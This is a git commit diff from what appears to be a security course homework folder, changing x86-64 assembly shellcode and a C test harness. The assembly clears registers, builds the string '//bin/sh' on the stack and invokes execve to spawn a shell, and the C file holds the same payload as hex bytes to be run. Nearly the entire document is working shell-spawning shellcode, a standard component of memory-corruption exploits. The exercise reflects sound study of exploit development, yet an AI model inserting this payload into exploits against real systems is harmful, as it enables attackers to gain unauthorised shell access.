d8b02453b7f8422ed9fcebf922a01187404531f5
Nikolas Koxenoglou <koxakin@gmail.com>
2017-03-22 19:42:05 +0200

    Step 1 working

--- hw1/shellcode.asm
+++ hw1/shellcode.asm
@@ -9,8 +9,10 @@ _start:
 ;clear out the registers we are going to need
 xor rax, rax
 xor rdi, rdi
+xor rsi, rsi
+xor rdx, rdx
 
-;//bin/sh =  2f, 62, 69, 6e, 2f, 73, 68
+;//bin/sh =  2f, 2f, 62, 69, 6e, 2f, 73, 68
 ;push n / s h
 push rsi
 push 0x6e69622f
@@ -20,10 +22,4 @@ mov dword [rsp+4], 0x68732f2f
 ;execve(path -> rdi, args -> rsi, envp -> dl)
 mov al,59
 mov rdi, rsp
-syscall
-
-xor rax, rax
-;exit(int ret)
-mov al,60
-xor rdi, rdi
 syscall
--- hw1/test.c
+++ hw1/test.c
@@ -3,21 +3,17 @@
 #include<string.h>
 
 const char code[] =
-"\x48\x31\xc0"             		/*xor    %rax,%rax */
-"\x48\x31\xff"             		/*xor    %rdi,%rdi */
-"\x56"                   		/*push   %rsi      */
-"\x68\x2f\x62\x69\x6e"       		/*pushq  $0x6e69622f */
-"\xc7\x44\x24\x04\x2f\x2f\x73\x68" 	/*movl   $0x68732f2f,0x4(%rsp) */
-"\xb0\x3b"               	 	/*mov    $0x3b,%al */
-"\x48\x89\xe7"             		/*mov    %rsp,%rdi */
-"\x0f\x05"                		/*syscall */
-"\x48\x31\xc0"             		/*xor    %rax,%rax */
-"\xb0\x3c"                		/*mov    $0x3c,%al */
-"\x48\x31\xff"             		/*xor    %rdi,%rdi */
-"\x0f\x05"                		/*syscall  */
-
+"\x48\x31\xc0"						//xor    %rax,%rax
+"\x48\x31\xff"						//xor    %rdi,%rdi
+"\x48\x31\xf6"						//xor    %rsi,%rsi
+"\x48\x31\xd2"						//xor    %rdx,%rdx
+"\x56"								//push   %rsi
+"\x68\x2f\x62\x69\x6e"				//pushq  $0x6e69622f
+"\xc7\x44\x24\x04\x2f\x2f\x73\x68"	//movl   $0x68732f2f,0x4(%rsp)
+"\xb0\x3b"							//mov    $0x3b,%al
+"\x48\x89\xe7"						//mov    %rsp,%rdi
+"\x0f\x05"							//syscall 
 ;
-
 int main( int argc, char *argv[]){
 
     char buf[sizeof(code)];
